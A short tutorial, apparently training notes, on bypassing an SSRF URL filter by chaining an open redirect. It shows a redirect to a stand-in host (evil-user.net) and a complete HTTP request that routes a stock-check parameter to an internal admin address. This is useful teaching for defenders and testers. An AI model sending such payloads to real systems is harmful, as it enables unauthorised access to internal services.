# Bypassing SSRF filters via open redirection

For example, the application contains an open redirection vulnerability in which the following URL:
```bash
/product/nextProduct?currentProductId=6&path=http://evil-user.net
```
returns redirection to:  `http://evil-user.net`
You can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows:
```bash
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```
This SSRF exploit works because the application first validates that the supplied `stockAPI` URL is on an allowed domain, which it is. 
The application then requests the supplied URL, which triggers the open redirection.
It follows the redirection, and makes a request to the internal URL of the attacker's choosing.
